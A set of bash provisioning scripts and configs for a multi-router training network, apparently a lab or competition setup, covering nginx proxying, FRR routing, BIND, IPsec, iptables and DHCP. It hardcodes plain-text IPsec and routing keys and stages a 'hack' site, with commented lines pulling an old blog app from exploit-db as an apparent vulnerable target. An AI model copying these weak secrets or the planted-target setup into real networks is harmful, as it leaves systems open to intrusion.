## repo
### base config (repo.sh)
```bash
#!/bin/bash

ens3="77.88.77.1"
int1="ens3"
int2="ens4"
nat_int="ens4"
network="/etc/network/interfaces"

echo "Start!"
sed -i '/^[[:space:]]*[^#]*ens3/s/^/#/' /etc/network/interfaces
echo -e '\nauto '$int1 '\niface '$int1 'inet static \naddress' $ens3 '\nnetmask 255.255.255.0' >> $network
#echo -e '\nauto '$int2 '\niface '$int2 'inet static \naddress' $ens4 '\nnetmask 255.255.255.0\n' >> $network
#echo -e '\nauto '$int3 '\niface '$int3 'inet static \naddress' $eth2 '\nnetmask 255.255.255.0\n' >> $network
echo -e '\nauto ens4 \niface ens4 inet dhcp' >> $network #для cloud NAT
echo -e '\nauto ens5 \niface ens5 inet dhcp' >> $network #для SSH

systemctl stop NetworkManager
systemctl disable NetworkManager
systemctl restart networking

hostnamectl set-hostname repo
sed -i 's/^127\.0\.1\.1.*/127\.0\.1\.1\trepo/g' /etc/hosts

#не требуется
#dhclient
#ip -o -4 addr show dev ens4 | awk '{split($4,a,"/"); print "nameserver " a[1]}' | tee /etc/resolv.conf

echo "file sudoers"
echo "gsadmin ALL=(ALL:ALL) ALL" > /etc/sudoers.d/gsadmin

#sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

echo "check packet forward: " 
cat /proc/sys/net/ipv4/ip_forward

echo -e "\napt update & install other packets"

apt update -y && apt install sudo ntpdate network-manager nano mc tree net-tools curl wget ufw tcpdump iptables dnsutils inetutils-telnet docker docker-compose procps ssh nginx git -y

sleep 1
echo "enable NAT:"

iptables -t nat -A POSTROUTING -o $nat_int -j MASQUERADE
sleep 1

iptables-save > /etc/iptables_rules.ipv4

cat iptables > /etc/network/if-pre-up.d/iptables
chmod +x /etc/network/if-pre-up.d/iptables


echo "Setup Proxy"
systemctl stop apache2
systemctl disable apache2
systemctl enable nginx
systemctl start nginx
rm /etc/nginx/sites-enabled/default
cp repo-proxy /etc/nginx/sites-enabled
sed -i '/server_tokens off;/a\\tserver_names_hash_bucket_size 64;' /etc/nginx/nginx.conf
nginx -t
systemctl restart nginx


echo "Preparating software"
rm /var/www/html/*
unzip nginx_content.zip -d /var/www/html
chmod -R 750 /var/www/html
chown -R www-data:www-data /var/www/html
systemctl restart nginx
# apt install git docker docker-compose
# git clone https://github.com/DevinKott/docker-compose-offline-install
# cd docker-compose-offline-install
# chmod +x ./script.sh


# mkdir corpblog
# cd corpblog
# docker pull m1k1o/blog:latest
# docker pull mariadb:10.1
# docker save -o blog.tar m1k1o/blog:latest
# docker save -o mariadb10-1.tar mariadb:10.1




# wget https://www.exploit-db.com/apps/d8329e2dbb14e0fe8ec101708721228f-blog-1.3.zip -O blog.zip
# unzip blog.zip
# mv blog-1.3 /var/www/html/coolblog
# rm /var/www/html/coolblog/favicon.ico
# rm /var/www/html/coolblog/README.md
# cd /var/www/html/coolblog/


# ./script.sh save /var/www/html/coolblog/docker-compose.yml
```

### repo-proxy
```bash
server {
        listen 80;
        server_name repo.greenskills.gs;
        root /var/www/html;
        access_log /var/log/nginx/repo-access.log;
        error_log /var/log/nginx/repo-error.log;

        location / {
                root /var/www/html;
                index index.html;
                }
        location /astra {
                proxy_pass https://download.astralinux.ru/astra;
                proxy_set_header Host download.astralinux.ru;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto $scheme;
                }
        location /redos {
                proxy_pass https://repo1.red-soft.ru/redos;
                proxy_set_header Host repo1.red-soft.ru;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto $scheme;
                }
        # Опционально: таймаут для соединения
        proxy_connect_timeout 60s;
        proxy_read_timeout 60s;
        proxy_send_timeout 60s;

        # Опционально: буферизация для улучшения производительности
        proxy_buffering on;
        #proxy_buffer_size 128k;
        #proxy_buffers 256k;

        # Опционально: обработка ошибок
        #error_page 500 502 503 504 /5xx.html;
        #location = /5xx.html {
        #root /var/www/html; # Замените на ваш путь к error page
        #}
}
server {
        listen 80;
        server_name site.greenskills.gs;
        root /var/www/html/;
        access_log /var/log/nginx/site-access.log;
        error_log /var/log/nginx/site-error.log;

        location /software {
                autoindex on;
                autoindex_exact_size off;
                }
}
server {
        listen 80;
        server_name hack.greenskills.gs;
        root /var/www/html/hacksite;
        access_log /var/log/nginx/hack-access.log;
        error_log /var/log/nginx/hack-error.log;

        location / {
                autoindex on;
                }
}

```

### iptables
```bash
#!/bin/bash
PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

iptables-restore < /etc/iptables_rules.ipv4
exit 0 
```

## isp
### base config
```bash
#!/bin/bash

eth0="100.10.10.1"
int1="eth0"
int2="eth1"
int3="eth2"
eth1="200.20.20.1"
eth2="77.88.77.88"
nat_int="eth2"
gateway_eth2="77.88.77.1"
network="/etc/network/interfaces"

echo "Start!"
sed -i '/^[[:space:]]*[^#]*eth0/s/^/#/' /etc/network/interfaces
echo -e '\nauto '$int1 '\niface '$int1 'inet static \naddress' $eth0 '\nnetmask 255.255.255.0' >> $network
echo -e '\nauto '$int2 '\niface '$int2 'inet static \naddress' $eth1 '\nnetmask 255.255.255.0\n' >> $network
echo -e '\nauto '$int3 '\niface '$int3 'inet static \naddress' $eth2 '\ngateway' $gateway_eth2 '\nnetmask 255.255.255.0\n' >> $network
echo -e '\nauto eth3 \niface eth3 inet dhcp' >> $network #для SSH

systemctl stop NetworkManager
systemctl disable NetworkManager

#sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

echo "check packet forward: " 
cat /proc/sys/net/ipv4/ip_forward

systemctl restart networking
hostnamectl set-hostname isp
sed -i 's/^127\.0\.1\.1.*/127\.0\.1\.1\tisp/g' /etc/hosts

echo "ENABLE DNS SERVER"
#БИНД ДОЛЖЕН БЫТЬ ПРЕДУСТАНОВЛЕН
#apt update
#sleep 3
#apt install bind9 -y
#sleep 3

mkdir /etc/bind/zones
cp db.external /etc/bind/zones
echo -e 'zone "greenskills.gs" {\n\ttype master;\n\tfile "/etc/bind/zones/db.external";\n};\n' >> /etc/bind/named.conf.default-zones
systemctl restart bind9



#dhclient
echo "nameserver 77.88.77.88" > /etc/resolv.conf

echo -e "\napt update & install other packets"

apt update -y && apt install network-manager nano mc tree net-tools curl wget ufw strongswan tcpdump iptables dnsutils inetutils-telnet ntpdate vim -y

sleep 10

#Требуется
echo "enable NAT:"
iptables -t nat -A POSTROUTING -o $nat_int -j MASQUERADE
sleep 1
iptables-save > /etc/iptables_rules.ipv4
cat iptables > /etc/network/if-pre-up.d/iptables
chmod +x /etc/network/if-pre-up.d/iptables


echo "ENABLE DAEMON OSPF & RIP"

frrpath="/etc/frr/daemons"
#echo "ospfd=yes" >> $frrpath 
echo "ripd=yes" >> $frrpath

echo "RESTART FRR"

echo "CONFIG FRR"
cat frr.conf > /etc/frr/frr.conf
systemctl restart frr.service
```

### frr.conf
```bash
frr version 8.5
frr defaults traditional
hostname ISP
log syslog informational
no ipv6 forwarding
service integrated-vtysh-config
!
key chain rtr1
 key 1
  key-string GreenSkillsRIP
 exit
exit
!
key chain rtr2
 key 1
  key-string GreenSkillsRIP
 exit
exit
!
interface eth0
 ip rip authentication key-chain rtr1
 ip rip authentication mode md5
 ip rip receive version 2
 ip rip send version 2
exit
!
interface eth1
 ip rip authentication key-chain rtr2
 ip rip authentication mode md5
 ip rip receive version 2
 ip rip send version 2
exit
!
interface eth2
exit
!
router rip
 neighbor 100.10.10.10
 neighbor 200.20.20.10
 network 200.20.20.0/24
 network 100.10.10.0/24
 passive-interface eth2
exit
!
```

### iptables
```bash
#!/bin/bash
PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

iptables-restore < /etc/iptables_rules.ipv4
exit 0 
```

### db.external
```bash
$TTL    604800
@       IN      SOA     greenskills.gs. root.greenskills.gs. (
                              3         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
; name servers - NS records - определяем имена DNS-серверов
        IN      NS      dns.localnet.example.ru.
; name servers - A records - определяем адреса компьютеров, сначала сервер(ы) DNS
@           IN      NS      greenskills.gs.
@           IN      A      77.88.77.88
repo           IN      A      77.88.77.1
site           IN      A      77.88.77.1
hack           IN      A      77.88.77.1
```

## ofc-rtr-02
### base config
```bash
#!/bin/bash

eth0="200.20.20.10"
gateway_eth0="200.20.20.1"
eth1="10.50.10.1"
#gateway_eth2="192.168.240.1"
nat_int="eth0"
remote_addr="100.10.10.10"
gre_ip="10.5.5.2"


echo "Start!"
sed -i '/^[[:space:]]*[^#]*eth0/s/^/#/' /etc/network/interfaces
echo -e '\nauto eth0 \niface eth0 inet static \naddress' $eth0 '\ngateway' $gateway_eth0 '\nnetmask 255.255.255.0' >> /etc/network/interfaces
echo -e '\nauto eth1 \niface eth1 inet static \naddress' $eth1 '\nnetmask 255.255.255.0\n' >> /etc/network/interfaces
echo -e '\nauto eth2 \niface eth2 inet dhcp' >> $network #для SSH

systemctl stop NetworkManager
systemctl disable NetworkManager
systemctl restart networking

# ADD GRE TUN
iptunnel add tun10 mode gre local $eth0 remote $remote_addr ttl 64
ip addr add $gre_ip/30 dev tun10
ip link set tun10 up

echo 'iptunnel add tun10 mode gre local' $eth0 'remote' $remote_addr 'ttl 64' > /root/gre.sh
echo 'ip addr add' $gre_ip/30 'dev tun10' >> /root/gre.sh
echo 'ip link set tun10 up' >> /root/gre.sh
chmod +x /root/gre.sh

echo '@reboot root /root/gre.sh' >> /etc/crontab

#systemctl restart networking

hostnamectl set-hostname OFC-RTR-02
sed -i 's/^127\.0\.1\.1.*/127\.0\.1\.1\tofc-rtr-02/g' /etc/hosts
#sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

echo "nameserver 77.88.77.88" > /etc/resolv.conf
echo "check packet forward: " 
cat /proc/sys/net/ipv4/ip_forward

#echo -e "\napt update & install other packets"

#apt update -y && apt install dnsutils net-tools iptables vim strongswan curl -y

sleep 1
echo "enable NAT:"

iptables -t nat -A POSTROUTING -o $nat_int -j MASQUERADE
sleep 1

iptables-save > /etc/iptables_rules.ipv4

cat iptables > /etc/network/if-pre-up.d/iptables
chmod +x /etc/network/if-pre-up.d/iptables

#echo "update repo for FRR"

#mkdir /usr/share/keyrings
#curl –s https://deb.frrouting.org/frr/keys.gpg | sudo tee /usr/share/keyrings/frrouting.gpg > /dev/null
#echo "deb [signed-by=/usr/share/keyrings/frrouting.gpg] https://deb.frrouting.org/frr stretch frr-stable" >> /etc/apt/sources.list
#apt update && apt install frr -y 

sleep 1
echo "ENABLE DAEMON OSPF & RIP"

echo "ospfd=yes" >> /etc/frr/daemons 
echo "ripd=yes" >> /etc/frr/daemons
echo "RESTART FRR"

echo "CONFIG FRR"

cat frr.conf > /etc/frr/frr.conf

systemctl restart frr.service

ipsecfile="/etc/ipsec.conf"
ipsecsecret="/etc/ipsec.secrets"

echo -e "conn vpn\n" > $ipsecfile
echo -e "\tauto=start\n" >> $ipsecfile
echo -e "\ttype=tunnel\n" >> $ipsecfile
echo -e "\tauthby=secret\n" >> $ipsecfile
echo -e "\tleft=200.20.20.10\n" >> $ipsecfile
echo -e "\tright=100.10.10.10\n" >> $ipsecfile
echo -e "\tleftsubnet=0.0.0.0/0\n" >> $ipsecfile
echo -e "\trightsubnet=0.0.0.0/0\n" >> $ipsecfile
echo -e "\tleftprotoport=gre\n" >> $ipsecfile
echo -e "\trightprotoport=gre\n" >> $ipsecfile
echo -e "\tike=aes128-sha256-modp3072\n" >> $ipsecfile
echo -e "\tesp=aes128-sha256" >> $ipsecfile

echo $eth0 $remote_addr ": PSK \"GreenSkillsIPSEC\" " > $ipsecsecret
```
### iptables
```bash
#!/bin/bash
PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

iptables-restore < /etc/iptables_rules.ipv4
exit 0 
```

### ipsec.secrets
```
# This file holds shared secrets or RSA private keys for authentication.

# RSA private key for this host, authenticating it to any other host
# which knows the public part.
```

### ipsec.conf
```bash
# ipsec.conf - strongSwan IPsec configuration file

# basic configuration

config setup
	# strictcrlpolicy=yes
	# uniqueids = no

# Add connections here.

# Sample VPN connections

#conn sample-self-signed
#      leftsubnet=10.1.0.0/16
#      leftcert=selfCert.der
#      leftsendcert=never
#      right=192.168.0.2
#      rightsubnet=10.2.0.0/16
#      rightcert=peerCert.der
#      auto=start

#conn sample-with-ca-cert
#      leftsubnet=10.1.0.0/16
#      leftcert=myCert.pem
#      right=192.168.0.2
#      rightsubnet=10.2.0.0/16
#      rightid="C=CH, O=Linux strongSwan CN=peer name"
#      auto=start
```
### frr.conf
```bash
frr version 8.5
frr defaults traditional
hostname RTR2
log syslog informational
no ipv6 forwarding
service integrated-vtysh-config
!
key chain rip2
 key 3
  key-string GreenSkillsRIP
 exit
exit
!
interface eth1
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 md5 GreenSkillsOSPF3
exit
!
interface tun10
 ip ospf authentication message-digest
 ip ospf message-digest-key 2 md5 GreenSkillsOSPF2
 ip ospf network broadcast
exit
!
interface eth0
 ip rip authentication key-chain rip2
 ip rip authentication mode md5
 ip rip receive version 2
 ip rip send version 2
exit
!
router rip
 neighbor 200.20.20.1
 network 200.20.20.0/24
 passive-interface tun10
 passive-interface eth1
exit
!
router ospf
 ospf router-id 10.5.5.2
 network 10.5.5.0/30 area 0
 network 10.50.10.0/24 area 1
 area 0 authentication message-digest
 area 1 authentication message-digest
 neighbor 10.5.5.1
 neighbor 10.50.10.10
exit
!
```

## data-rtr-01
### public service
```bash
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j DNAT --to-destination 192.168.100.10:443
iptables -A FORWARD -i eth0 -d 192.168.100.10 -p tcp --dport 443 -j ACCEPT



iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8443 -j DNAT --to-destination 192.168.100.10:8443
iptables -A FORWARD -i eth0 -d 192.168.100.10 -p tcp --dport 8443 -j ACCEPT
```

### base
```bash
#!/bin/bash

eth0="100.10.10.10"
gateway_eth0="100.10.10.1"
eth1="192.168.240.1"
#gateway_eth2="192.168.240.1"
nat_int="eth0"
remote_addr="200.20.20.10"
gre_ip="10.5.5.1"


echo "Start!"
sed -i '/^[[:space:]]*[^#]*eth0/s/^/#/' /etc/network/interfaces
echo -e '\nauto eth0 \niface eth0 inet static \naddress' $eth0 '\ngateway' $gateway_eth0 '\nnetmask 255.255.255.0' >> /etc/network/interfaces
echo -e '\nauto eth1 \niface eth1 inet static \naddress' $eth1 '\nnetmask 255.255.255.0\n' >> /etc/network/interfaces
echo -e '\nauto eth2 \niface eth2 inet dhcp' >> $network #для SSH

#echo -e '\nauto gre10 \niface gre10 inet static \naddress' $gre_ip '\ngateway' $gateway_gre '\nnetmask 255.255.255.252' >> int.txt
systemctl stop NetworkManager
systemctl disable NetworkManager
systemctl restart networking

# ADD GRE TUN
iptunnel add tun10 mode gre local $eth0 remote $remote_addr ttl 64
ip addr add $gre_ip/30 dev tun10
ip link set tun10 up

echo 'iptunnel add tun10 mode gre local' $eth0 'remote' $remote_addr 'ttl 64' > /root/gre.sh
echo 'ip addr add' $gre_ip/30 'dev tun10' >> /root/gre.sh
echo 'ip link set up tun10 up' >> /root/gre.sh
chmod +x /root/gre.sh

echo "@reboot root /root/gre.sh" >> /etc/crontab

#systemctl restart networking

hostnamectl set-hostname data-rtr-01
sed -i 's/^127\.0\.1\.1.*/127\.0\.1\.1\tdata-rtr-01/g' /etc/hosts

#sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

echo "nameserver 77.88.77.88" > /etc/resolv.conf
echo "check packet forward: " 
cat /proc/sys/net/ipv4/ip_forward

echo -e "\napt update & install other packets"

apt update -y && apt install dnsutils net-tools iptables vim strongswan curl -y

sleep 1
echo "enable NAT:"

iptables -t nat -A POSTROUTING -o $nat_int -j MASQUERADE
sleep 1

iptables-save > /etc/iptables_rules.ipv4

cat iptables > /etc/network/if-pre-up.d/iptables
chmod +x /etc/network/if-pre-up.d/iptables

#echo "update repo for FRR"

#mkdir /usr/share/keyrings
#curl –s https://deb.frrouting.org/frr/keys.gpg | sudo tee /usr/share/keyrings/frrouting.gpg > /dev/null
#echo "deb [signed-by=/usr/share/keyrings/frrouting.gpg] https://deb.frrouting.org/frr stretch frr-stable" >> /etc/apt/sources.list
#apt update -y && apt install frr -y 

#sleep 1
echo "ENABLE DAEMON OSPF & RIP"

echo "ospfd=yes" >> /etc/frr/daemons 
echo "ripd=yes" >> /etc/frr/daemons
echo "RESTART FRR"

echo "CONFIG FRR"

cat frr.conf > /etc/frr/frr.conf

systemctl restart frr.service

ipsecfile="/etc/ipsec.conf"
ipsecsecret="/etc/ipsec.secrets"

echo -e "conn vpn\n" > $ipsecfile
echo -e "\tauto=start\n" >> $ipsecfile
echo -e "\ttype=tunnel\n" >> $ipsecfile
echo -e "\tauthby=secret\n" >> $ipsecfile
echo -e "\tleft=100.10.10.10\n" >> $ipsecfile
echo -e "\tright=200.20.20.10\n" >> $ipsecfile
echo -e "\tleftsubnet=0.0.0.0/0\n" >> $ipsecfile
echo -e "\trightsubnet=0.0.0.0/0\n" >> $ipsecfile
echo -e "\tleftprotoport=gre\n" >> $ipsecfile
echo -e "\trightprotoport=gre\n" >> $ipsecfile
echo -e "\tike=aes128-sha256-modp3072\n" >> $ipsecfile
echo -e "\tesp=aes128-sha256" >> $ipsecfile

echo $eth0 $remote_addr ": PSK \"GreenSkillsIPSEC\" " > $ipsecsecret

systemctl restart ipsec
```

### iptables
```
#!/bin/bash
PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

iptables-restore < /etc/iptables_rules.ipv4
exit 0 
```

### ipsec.secrets
```
# This file holds shared secrets or RSA private keys for authentication.

# RSA private key for this host, authenticating it to any other host
# which knows the public part.
```

### ipsec.conf
```bash
# ipsec.conf - strongSwan IPsec configuration file

# basic configuration

config setup
	# strictcrlpolicy=yes
	# uniqueids = no

# Add connections here.

# Sample VPN connections

#conn sample-self-signed
#      leftsubnet=10.1.0.0/16
#      leftcert=selfCert.der
#      leftsendcert=never
#      right=192.168.0.2
#      rightsubnet=10.2.0.0/16
#      rightcert=peerCert.der
#      auto=start

#conn sample-with-ca-cert
#      leftsubnet=10.1.0.0/16
#      leftcert=myCert.pem
#      right=192.168.0.2
#      rightsubnet=10.2.0.0/16
#      rightid="C=CH, O=Linux strongSwan CN=peer name"
#      auto=start
```

### frr.conf
```
frr version 8.5
frr defaults traditional
hostname data-rtr1
log syslog informational
no ipv6 forwarding
service integrated-vtysh-config
!
key chain rip2
 key 3
  key-string GreenSkillsRIP
 exit
exit
!
interface eth1
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 md5 GreenSkillsOSPF1
exit
!
interface tun10
 ip ospf authentication message-digest
 ip ospf message-digest-key 2 md5 GreenSkillsOSPF2
 ip ospf network broadcast
exit
!
interface eth0
 ip rip authentication key-chain rip2
 ip rip authentication mode md5
 ip rip receive version 2
 ip rip send version 2
exit
!
router rip
 neighbor 100.10.10.1
 network 100.10.10.0/24
 passive-interface tun10
 passive-interface eth1
exit
!
router ospf
 ospf router-id 10.5.5.1
 network 10.5.5.0/30 area 0
 network 192.168.240.0/24 area 1
 area 0 authentication message-digest
 area 1 authentication message-digest
 neighbor 10.5.5.2
 neighbor 192.168.240.10
exit
!
```

## data-fw
### base
```bash
#!/bin/bash

eth0="192.168.240.10"
gateway_eth0="192.168.240.1"
eth1="192.168.50.1"
eth2="192.168.100.1"
eth3="192.168.150.1"
#gateway_eth2="192.168.240.1"
nat_int="eth0"
remote_addr="200.20.20.10"
gre_ip="10.5.5.1"

network="/etc/network/interfaces"

echo "Start!"
sed -i '/^[[:space:]]*[^#]*eth0/s/^/#/' /etc/network/interfaces
echo -e '\nauto eth0 \niface eth0 inet static \naddress' $eth0 '\ngateway' $gateway_eth0 '\nnetmask 255.255.255.0' >> $network

echo -e '\nauto eth1 \niface eth1 inet static \naddress' $eth1 '\nnetmask 255.255.255.0\n' >> $network

echo -e '\nauto eth2 \niface eth2 inet static \naddress' $eth2 '\nnetmask 255.255.255.0\n' >> $network

echo -e '\nauto eth3 \niface eth3 inet static \naddress' $eth3 '\nnetmask 255.255.255.0\n' >> $network
echo -e '\nauto eth4 \niface eth4 inet dhcp' >> $network #для SSH
#echo -e '\nauto gre10 \niface gre10 inet static \naddress' $gre_ip '\ngateway' $gateway_gre '\nnetmask 255.255.255.252' >> int.txt

systemctl stop NetworkManager
systemctl disable NetworkManager
systemctl restart networking

hostnamectl set-hostname data-fw
sed -i 's/^127\.0\.1\.1.*/127\.0\.1\.1\tdata-fw/g' /etc/hosts
#sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

echo "nameserver 77.88.77.88" > /etc/resolv.conf

echo "check packet forward: " 
cat /proc/sys/net/ipv4/ip_forward

#echo -e "\napt update & install other packets"

#apt update -y && apt install dnsutils net-tools iptables vim strongswan curl -y

#sleep 1
#echo "enable NAT:"

#iptables -t nat -A POSTROUTING -o $nat_int -j MASQUERADE

#echo "update repo for FRR"

#mkdir /usr/share/keyrings

#curl –s https://deb.frrouting.org/frr/keys.gpg | sudo tee /usr/share/keyrings/frrouting.gpg > /dev/null

#echo "deb [signed-by=/usr/share/keyrings/frrouting.gpg] https://deb.frrouting.org/frr stretch frr-stable" >> /etc/apt/sources.list

#apt update -y && apt install frr -y 

sleep 1
echo "ENABLE DAEMON OSPF & RIP"

echo "ospfd=yes" >> /etc/frr/daemons 
#echo "ripd=yes" >> /etc/frr/daemons
echo "RESTART FRR"

echo "CONFIG FRR"

cat frr.conf > /etc/frr/frr.conf

systemctl restart frr.service
```

### frr.conf
```bash
frr version 8.5
frr defaults traditional
hostname data-fw1
log syslog informational
no ip forwarding
no ipv6 forwarding
service integrated-vtysh-config
!
interface eth0
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 md5 GreenSkillsOSPF1
exit
!
router ospf
 ospf router-id 192.168.240.10
 network 192.168.50.0/24 area 1
 network 192.168.100.0/24 area 1
 network 192.168.150.0/24 area 1
 network 192.168.240.0/24 area 1
 area 1 authentication message-digest
 neighbor 192.168.240.1
exit
!
```
### iptables
```bash
#!/bin/bash
PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

iptables-restore < /etc/iptables_rules.ipv4
exit 0 
```
rules
```
# DATA-FW
iptables -A FORWARD -s 192.168.100.0/24 -d 10.10.10.0/24 -j DROP
iptables -A FORWARD -s 192.168.100.0/24 -d 10.20.10.0/24 -j DROP
iptables -A FORWARD -s 192.168.100.0/24 -d 10.30.10.0/24 -j DROP

# 10.10.10.0/24 -> 192.168.150.0/24
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.150.0/24 -p tcp --dport 22 -j ACCEPT
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.150.0/24 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.150.0/24 -p tcp --dport 443 -j ACCEPT
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.150.0/24 -p tcp --dport 514 -j ACCEPT
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.150.0/24 -p udp --dport 514 -j ACCEPT
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.150.0/24 -j DROP

# 10.20.10.0/24 -> 192.168.150.0/24
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.150.0/24 -p tcp --dport 22 -j ACCEPT
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.150.0/24 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.150.0/24 -p tcp --dport 443 -j ACCEPT
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.150.0/24 -p tcp --dport 514 -j ACCEPT
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.150.0/24 -p udp --dport 514 -j ACCEPT
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.150.0/24 -j DROP

# 10.30.10.0/24 -> 192.168.150.0/24
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.150.0/24 -p tcp --dport 22 -j ACCEPT
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.150.0/24 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.150.0/24 -p tcp --dport 443 -j ACCEPT
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.150.0/24 -p tcp --dport 514 -j ACCEPT
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.150.0/24 -p udp --dport 514 -j ACCEPT
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.150.0/24 -j DROP

# 10.10.10.0/24 -> 192.168.100.0/24
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.100.0/24 -p tcp --dport 22 -j ACCEPT
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.100.0/24 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.100.0/24 -p tcp --dport 443 -j ACCEPT
iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.100.0/24 -j DROP

# 10.20.10.0/24 -> 192.168.100.0/24
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.100.0/24 -p tcp --dport 22 -j ACCEPT
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.100.0/24 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.100.0/24 -p tcp --dport 443 -j ACCEPT
iptables -A FORWARD -s 10.20.10.0/24 -d 192.168.100.0/24 -j DROP

# 10.30.10.0/24 -> 192.168.100.0/24
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.100.0/24 -p tcp --dport 22 -j ACCEPT
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.100.0/24 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.100.0/24 -p tcp --dport 443 -j ACCEPT
iptables -A FORWARD -s 10.30.10.0/24 -d 192.168.100.0/24 -j DROP

# 192.168.50.0/24 -> Internet
iptables -A FORWARD -s 192.168.50.0/24 -d 77.88.77.0/24 -j DROP
iptables -A FORWARD -s 192.168.50.0/24 -d 100.10.10.0/24 -j DROP
```

## ofc-fw
### base
```bash
#!/bin/bash

eth0="10.50.10.10"
gateway_eth0="10.50.10.1"
eth1="10.10.10.1"
eth2="10.20.10.1"
eth3="10.30.10.1"
network="/etc/network/interfaces"

echo "Start!"
sed -i '/^[[:space:]]*[^#]*eth0/s/^/#/' /etc/network/interfaces
echo -e '\nauto eth0 \niface eth0 inet static \naddress' $eth0 '\ngateway' $gateway_eth0 '\nnetmask 255.255.255.0' >> $network

echo -e '\nauto eth1 \niface eth1 inet static \naddress' $eth1 '\nnetmask 255.255.255.0\n' >> $network

echo -e '\nauto eth2 \niface eth2 inet static \naddress' $eth2 '\nnetmask 255.255.255.0\n' >> $network
echo -e '\nauto eth3 \niface eth3 inet static \naddress' $eth3 '\nnetmask 255.255.255.0\n' >> $network

echo -e '\nauto eth4 \niface eth4 inet dhcp' >> $network #для SSH
#echo -e '\nauto eth1 \niface eth3 inet static \naddress' $eth3 '\nnetmask 255.255.255.0\n' >> $network
#echo -e '\nauto gre10 \niface gre10 inet static \naddress' $gre_ip '\ngateway' $gateway_gre '\nnetmask 255.255.255.252' >> int.txt

systemctl stop NetworkManager
systemctl disable NetworkManager
systemctl restart networking

hostnamectl set-hostname ofc-fw
sed -i 's/^127\.0\.1\.1.*/127\.0\.1\.1\tofc-fw/g' /etc/hosts

echo "nameserver 77.88.77.88" > /etc/resolv.conf

#sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

echo "check packet forward: " 
cat /proc/sys/net/ipv4/ip_forward

#echo -e "\napt update & install other packets"

#apt update -y && apt install dnsutils net-tools iptables vim strongswan curl -y

sleep 1
#echo "enable NAT:"

#iptables -t nat -A POSTROUTING -o $nat_int -j MASQUERADE

#echo "update repo for FRR"
#mkdir /usr/share/keyrings
#curl –s https://deb.frrouting.org/frr/keys.gpg | sudo tee /usr/share/keyrings/frrouting.gpg > /dev/null
#echo "deb [signed-by=/usr/share/keyrings/frrouting.gpg] https://deb.frrouting.org/frr stretch frr-stable" >> /etc/apt/sources.list
#apt update -y && apt install frr -y 

sleep 1
echo "ENABLE DAEMON OSPF & RIP"

echo "ospfd=yes" >> /etc/frr/daemons 
echo "RESTART FRR"

echo "CONFIG FRR"

cat frr.conf > /etc/frr/frr.conf

systemctl restart frr.service



echo "Enable DHCP" 
apt install isc-dhcp-server -y
mv /etc/default/isc-dhcp-server /etc/default/isc-dhcp-server.back
cp isc-dhcp-server /etc/default/
mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.back
cp dhcpd.conf /etc/dhcp/
systemctl enable isc-dhcp-server
systemctl start isc-dhcp-server

echo "local7.* /var/log/dhcpd.log" >> /etc/rsyslog.conf
systemctl restart rsyslog
systemctl restart isc-dhcp-server
```

### frr.conf
```bash
frr version 8.5
frr defaults traditional
hostname OFFICE-FW2
log syslog informational
no ipv6 forwarding
service integrated-vtysh-config
!
